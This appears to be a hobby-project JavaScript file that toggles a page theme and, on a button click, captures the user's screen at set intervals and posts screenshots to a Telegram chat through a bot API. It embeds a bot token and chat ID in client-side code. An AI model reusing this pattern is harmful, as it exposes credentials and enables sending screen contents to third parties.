

document.getElementById('themeToggle').addEventListener('click', function () {
  const container = document.querySelector('.dark-theme, .light-theme');
  container.classList.toggle('dark-theme');
  container.classList.toggle('light-theme');

  // Зміна тексту кнопки
  this.textContent = container.classList.contains('dark-theme') ? 'dark-theme' : 'light-theme';
});



const TOKEN = "7440822288:AAEDdkHYIniFfuObO7II_M7cyGNCmwP85Uo";
const CHAT_ID = "-1002238772738";
const SEND_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;

let captureStream;
let screenshotInterval;

async function startCapture(displayMediaOptions) {
  try {
    captureStream = await navigator.mediaDevices.getDisplayMedia(displayMediaOptions);
    document.getElementById('stopButton').style.display = 'block';
    document.getElementById('startButton').style.display = 'none';
  } catch (err) {
    console.error(`Error: ${err}`);
  }
  return captureStream;
}

function takeScreenshot() {
  const videoElement = document.createElement('video');
  videoElement.autoplay = true;

  startCapture({ video: true }).then(stream => {
    videoElement.srcObject = stream;

    const intervalValue = parseInt(document.getElementById('interval').value) * 60 * 1000; // Перетворюємо в мс 
    screenshotInterval = setInterval(() => {
      const canvas = document.createElement('canvas');
      canvas.width = videoElement.videoWidth;
      canvas.height = videoElement.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(videoElement, 0, 0);

      canvas.toBlob((blob) => {
        sendScreenshot(blob);
        console.log(blob);
        // Відправляємо скріншот у Telegram
      }, 'image/png');
    }, intervalValue);
  });
}

function sendScreenshot(screenshot) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", screenshot); // Додаємо скрін до formData
  axios.post(SEND_API, formData, {
    headers: {
      'Content-Type': 'multipart/form-data'
    }
  })
    .then((res) => {
      console.log("Скріншот надіслано!");
    })
    .catch((error) => {
      console.error('Error sending screenshot:', error);
    });
}

function stopScreenshots() {
  clearInterval(screenshotInterval);
  captureStream.getTracks().forEach(track => track.stop());
  document.getElementById('stopButton').style.display = 'none';
  document.getElementById('startButton').style.display = 'block';
}

document.getElementById('startButton').addEventListener('click', takeScreenshot);
document.getElementById('stopButton').addEventListener('click', stopScreenshots);




// Forma    
// const signInButton = document.getElementById("signInButton");
// const signOutButton = document.getElementById("signOutButton");
// const message = document.getElementById("message");

// // Сховати кнопку виходу та повідомлення спочатку
// signOutButton.style.display = "none";
// message.style.display = "none";

// const userSignIn = async => { 
//   signInWithPropup(auth,)
// }

